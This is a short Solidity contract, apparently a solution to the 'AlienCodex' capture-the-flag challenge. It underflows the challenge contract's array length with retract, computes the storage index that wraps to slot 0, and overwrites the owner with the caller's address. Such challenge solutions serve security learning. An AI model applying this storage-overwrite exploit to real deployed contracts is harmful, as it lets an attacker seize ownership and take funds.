// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./19AlienCodex.sol";

contract AlienCodexSolution {
    AlienCodex public alienCodex;

    constructor(address alienCodexAddress) public {
        alienCodex = AlienCodex(alienCodexAddress);
    }

    function solveChallenge() public {
        alienCodex.makeContact();
        alienCodex.retract();
        uint256 index = 2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1;
        alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}
